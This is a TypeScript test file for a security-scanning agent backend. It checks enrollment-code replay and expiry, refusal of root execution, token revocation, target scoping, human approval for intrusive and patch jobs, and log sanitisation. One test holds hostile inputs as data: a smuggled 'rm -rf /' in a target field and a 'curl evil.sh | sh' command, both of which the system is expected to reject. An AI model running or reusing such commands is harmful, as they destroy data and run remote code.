import test from 'node:test';
import assert from 'node:assert/strict';
import {
  createInitialStoreState,
  validateHttpsBackendUrl,
  issueEnrollmentCode,
  enrollAgentWithCode,
  recordAgentHeartbeat,
  rotateAgentCredential,
  revokeAgentCredential,
  submitScanJob,
  approveScanJob,
  computeConnectionStatus,
  sanitizeText,
} from './sentinelEngine';
import { buildSetupPackageTarGz } from './setupPackageBuilder';

test('rejects invalid enrollment codes and single-use replay attempts', () => {
  const state = createInitialStoreState('https://sentinel.research.internal');
  const now = new Date('2026-10-24T10:00:00Z');

  const issued = issueEnrollmentCode(state, { label: 'kali-usb-01', ttlMinutes: 15, now });
  assert.equal(issued.ok, true);
  const code = issued.data!.enrollmentCodePlaintext;

  // 1. Invalid enrollment code must fail
  const invalidAttempt = enrollAgentWithCode(state, {
    enrollmentCode: 'SEN-ENROLL-INVALID-000000',
    hostname: 'kali-live',
    linuxUser: 'kali',
    uid: 1000,
    configFileMode: '0600',
    now,
  });
  assert.equal(invalidAttempt.ok, false);
  assert.equal(invalidAttempt.code, 'INVALID_ENROLLMENT_CODE');

  // 2. First valid enrollment succeeds
  const validAttempt = enrollAgentWithCode(state, {
    enrollmentCode: code,
    hostname: 'kali-live',
    linuxUser: 'kali',
    uid: 1000,
    configFileMode: '0600',
    now,
  });
  assert.equal(validAttempt.ok, true);
  assert.equal(validAttempt.code, 'AGENT_ENROLLED');

  // 3. Second attempt with same single-use code must fail
  const replayAttempt = enrollAgentWithCode(state, {
    enrollmentCode: code,
    hostname: 'kali-clone',
    linuxUser: 'kali',
    uid: 1000,
    configFileMode: '0600',
    now,
  });
  assert.equal(replayAttempt.ok, false);
  assert.equal(replayAttempt.code, 'ENROLLMENT_CODE_ALREADY_USED');
});

test('rejects expired enrollment codes and root user execution', () => {
  const state = createInitialStoreState('https://sentinel.research.internal');
  const issuedAt = new Date('2026-10-24T10:00:00Z');
  const issued = issueEnrollmentCode(state, { ttlMinutes: 10, now: issuedAt });
  const code = issued.data!.enrollmentCodePlaintext;

  // Attempt after 11 minutes -> expired
  const expiredAt = new Date('2026-10-24T10:11:00Z');
  const expiredAttempt = enrollAgentWithCode(state, {
    enrollmentCode: code,
    hostname: 'kali-live',
    linuxUser: 'kali',
    uid: 1000,
    configFileMode: '0600',
    now: expiredAt,
  });
  assert.equal(expiredAttempt.ok, false);
  assert.equal(expiredAttempt.code, 'ENROLLMENT_CODE_EXPIRED');

  // Issue fresh code and attempt as root (UID 0) -> forbidden
  const fresh = issueEnrollmentCode(state, { ttlMinutes: 15, now: expiredAt });
  const rootAttempt = enrollAgentWithCode(state, {
    enrollmentCode: fresh.data!.enrollmentCodePlaintext,
    hostname: 'kali-live',
    linuxUser: 'root',
    uid: 0,
    configFileMode: '0600',
    now: expiredAt,
  });
  assert.equal(rootAttempt.ok, false);
  assert.equal(rootAttempt.code, 'ROOT_EXECUTION_FORBIDDEN');
});

test('rejects unauthorized requests, expired credentials, and revoked credentials on heartbeat', () => {
  const state = createInitialStoreState('https://sentinel.research.internal');
  const now = new Date('2026-10-24T10:00:00Z');

  const issued = issueEnrollmentCode(state, { ttlMinutes: 15, now });
  const enrolled = enrollAgentWithCode(state, {
    enrollmentCode: issued.data!.enrollmentCodePlaintext,
    hostname: 'kali-live',
    linuxUser: 'kali',
    uid: 1000,
    configFileMode: '0600',
    now,
  });
  const token = enrolled.data!.agentCredentialToken;
  const agentId = enrolled.data!.agent.id;

  // 1. Unauthorized token must fail
  const unauthorized = recordAgentHeartbeat(state, {
    bearerToken: 'stnl_live_forged_invalid_token_12345',
    linuxUser: 'kali',
    uid: 1000,
    now,
  });
  assert.equal(unauthorized.ok, false);
  assert.equal(unauthorized.code, 'UNAUTHORIZED_TOKEN');

  // 2. Valid token succeeds
  const validHb = recordAgentHeartbeat(state, {
    bearerToken: token,
    linuxUser: 'kali',
    uid: 1000,
    now,
  });
  assert.equal(validHb.ok, true);
  assert.equal(computeConnectionStatus(state, now).status, 'Connected');

  // 3. Expired token fails (8 days later)
  const eightDaysLater = new Date(now.getTime() + 8 * 24 * 3600_000);
  const expiredHb = recordAgentHeartbeat(state, {
    bearerToken: token,
    linuxUser: 'kali',
    uid: 1000,
    now: eightDaysLater,
  });
  assert.equal(expiredHb.ok, false);
  assert.equal(expiredHb.code, 'CREDENTIAL_EXPIRED');

  // 4. Rotate credential and then revoke -> revoked token fails
  const rotated = rotateAgentCredential(state, { agentId, now });
  assert.equal(rotated.ok, true);
  const newToken = rotated.data!.rotatedTokenPlaintext;

  revokeAgentCredential(state, { agentId, reason: 'USB drive lost', now });
  const revokedHb = recordAgentHeartbeat(state, {
    bearerToken: newToken,
    linuxUser: 'kali',
    uid: 1000,
    now,
  });
  assert.equal(revokedHb.ok, false);
  assert.equal(revokedHb.code, 'CREDENTIAL_REVOKED');
});

test('blocks out-of-scope scan jobs, arbitrary shell commands, and enforces human approval for intrusive or patch jobs', () => {
  const state = createInitialStoreState('https://sentinel.research.internal');
  const now = new Date('2026-10-24T10:00:00Z');

  // 1. Out-of-scope public IP target rejected
  const outOfScope = submitScanJob(state, {
    agentId: 'agt-test',
    operationId: 'passive_port_inventory',
    target: '8.8.8.8',
    now,
  });
  assert.equal(outOfScope.ok, false);
  assert.equal(outOfScope.code, 'TARGET_OUT_OF_SCOPE');

  // 2. Arbitrary shell command injection rejected
  const commandInjection = submitScanJob(state, {
    agentId: 'agt-test',
    operationId: 'passive_port_inventory',
    target: '10.24.0.10; rm -rf /',
    rawCommandAttempt: 'bash -c "curl evil.sh | sh"',
    now,
  });
  assert.equal(commandInjection.ok, false);
  assert.equal(commandInjection.code, 'ARBITRARY_COMMAND_FORBIDDEN');

  // 3. In-scope non-intrusive job queues directly
  const inScopePassive = submitScanJob(state, {
    agentId: 'agt-test',
    operationId: 'passive_port_inventory',
    target: '10.24.0.15',
    now,
  });
  assert.equal(inScopePassive.ok, true);
  assert.equal(inScopePassive.data!.job.status, 'queued');

  // 4. Intrusive vulnerability test without human approval requires approval
  const intrusiveImmediate = submitScanJob(state, {
    agentId: 'agt-test',
    operationId: 'intrusive_vuln_verification',
    target: '10.24.0.22',
    requireImmediateDispatch: true,
    now,
  });
  assert.equal(intrusiveImmediate.ok, false);
  assert.equal(intrusiveImmediate.code, 'HUMAN_APPROVAL_REQUIRED');

  // 5. Queueing patch deployment places it in pending_human_approval until approved by human
  const patchPending = submitScanJob(state, {
    agentId: 'agt-test',
    operationId: 'signed_patch_deployment',
    target: 'lab-node-01.sentinel.internal',
    now,
  });
  assert.equal(patchPending.ok, true);
  assert.equal(patchPending.data!.job.status, 'pending_human_approval');

  const approved = approveScanJob(state, {
    jobId: patchPending.data!.job.id,
    approverName: 'Neha Raut (Lead Researcher)',
    approverNote: 'Approved maintenance window CHG-2041 for lab-node-01.',
    now,
  });
  assert.equal(approved.ok, true);
  assert.equal(approved.data!.job.status, 'approved_dispatched');
});

test('setup package never embeds live tokens or autorun and sanitizes logs', () => {
  const { manifest, tarGzBuffer } = buildSetupPackageTarGz('1.4.2', 'https://sentinel.research.internal');
  assert.equal(manifest.containsLiveSecrets, false);
  assert.equal(manifest.autorunIncluded, false);
  assert.ok(tarGzBuffer.byteLength > 500);

  for (const file of manifest.files) {
    assert.equal(file.content.includes('stnl_live_'), false, `File ${file.path} must not contain live token`);
    assert.equal(file.content.includes('SEN-ENROLL-'), false, `File ${file.path} must not contain live enrollment code`);
    assert.equal(file.path.toLowerCase().includes('autorun.inf'), false);
  }

  const dirtyLog = 'Connecting with Bearer stnl_live_998877665544 and code SEN-ENROLL-AAA-BBB-CCC';
  const sanitized = sanitizeText(dirtyLog);
  assert.equal(sanitized.includes('998877665544'), false);
  assert.equal(sanitized.includes('AAA-BBB-CCC'), false);

  const urlWithToken = validateHttpsBackendUrl('https://sentinel.example.org?token=secret123');
  assert.equal(urlWithToken.ok, false);
  assert.equal(urlWithToken.code, 'CREDENTIALS_IN_URL_FORBIDDEN');
});
